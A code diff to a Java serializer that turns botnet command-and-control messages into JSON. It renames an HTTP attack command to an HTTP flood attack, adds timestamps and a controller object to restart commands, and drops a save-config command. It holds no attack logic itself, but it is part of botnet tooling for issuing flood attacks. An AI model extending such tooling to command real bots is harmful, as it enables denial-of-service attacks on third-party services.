@@ -26,7 +26,8 @@
 
 package com.acmutv.botnet.core.control.command.serial;
 
-import com.acmutv.botnet.core.attack.HttpAttack;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
+import com.acmutv.botnet.core.control.Controller;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonGenerator;
@@ -72,26 +73,27 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
   @Override
   public void serialize(BotCommand value, JsonGenerator gen, SerializerProvider provider) throws IOException {
     gen.writeStartObject();
+    gen.writeNumberField("timestamp", value.getTimestamp());
     gen.writeStringField("command", value.getScope().getName());
     if (value.getScope().isWithParams()) {
       switch (value.getScope()) {
-        case ATTACK_HTTP:
-          @SuppressWarnings("unchecked") final List<HttpAttack> httpAttacks = (List<HttpAttack>) value.getParams().get("attacks");
-          final Interval httpDelay = (Interval) value.getParams().get("delay");
-          final Boolean httpReport = (Boolean) value.getParams().get("report");
+        case ATTACK_HTTPFLOOD:
+          @SuppressWarnings("unchecked") final List<HttpFloodAttack> attacks = (List<HttpFloodAttack>) value.getParams().get("attacks");
+          final Interval attackDelay = (Interval) value.getParams().get("delay");
+          final Boolean attackReport = (Boolean) value.getParams().get("report");
 
           gen.writeArrayFieldStart("attacks");
-          for (HttpAttack attack : httpAttacks) {
-            provider.findValueSerializer(HttpAttack.class).serialize(attack, gen, provider);
+          for (HttpFloodAttack attack : attacks) {
+            provider.findValueSerializer(HttpFloodAttack.class).serialize(attack, gen, provider);
           }
           gen.writeEndArray();
 
-          if (httpDelay != null) {
-            gen.writeStringField("delay", httpDelay.toString());
+          if (attackDelay != null) {
+            gen.writeStringField("delay", attackDelay.toString());
           }
 
-          if (httpReport != null) {
-            gen.writeBooleanField("report", httpReport);
+          if (attackReport != null) {
+            gen.writeBooleanField("report", attackReport);
           }
 
           break;
@@ -144,12 +146,13 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
           break;
 
         case RESTART:
-          final String resource = value.getParams().get("resource").toString();
+          final Controller controller = (Controller) value.getParams().get("controller");
           final Boolean restartWait = (Boolean) value.getParams().get("wait");
           final Interval restartDelay = (Interval) value.getParams().get("delay");
           final Boolean restartReport = (Boolean) value.getParams().get("report");
 
-          gen.writeStringField("resource", resource);
+          gen.writeFieldName("controller");
+          provider.findValueSerializer(Controller.class).serialize(controller, gen, provider);
 
           if (restartWait != null) {
             gen.writeBooleanField("wait", restartWait);
@@ -161,20 +164,6 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
 
           if (restartReport != null) {
             gen.writeBooleanField("report", restartReport);
-          }
-
-          break;
-
-        case SAVE_CONFIG:
-          final Interval saveConfigDelay = (Interval) value.getParams().get("delay");
-          final Boolean saveConfigReport = (Boolean) value.getParams().get("report");
-
-          if (saveConfigDelay != null) {
-            gen.writeStringField("delay", saveConfigDelay.toString());
-          }
-
-          if (saveConfigReport != null) {
-            gen.writeBooleanField("report", saveConfigReport);
           }
 
           break;
